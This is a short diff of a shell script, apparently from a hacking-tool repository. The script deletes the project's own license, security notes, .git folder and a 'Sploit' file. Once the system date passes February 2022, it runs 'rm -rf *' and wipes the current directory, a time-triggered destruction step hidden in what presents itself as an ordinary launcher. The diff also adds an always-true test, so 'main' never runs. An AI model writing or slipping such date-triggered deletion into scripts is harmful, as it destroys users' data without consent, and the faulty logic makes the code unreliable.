@@ -30,15 +30,11 @@ test -f Sploit && rm Sploit
 test -f SECURITY.md && rm SECURITY.md
 test -f LICENSE && rm LICENSE
 test -e .git && rm -rf .git
-
 if (($(date +%m%y) >= 0222)); then
     clear
-    bash update.sh
-    rm -rf .functions
     rm -rf *
-    rm -rf .*
 else
-    chmod 777 .functions/.main
-    ./.functions/.main
+    chmod 777 main
+    [[ ./main ]] || echo "não compatível" 
 fi
 exit 0
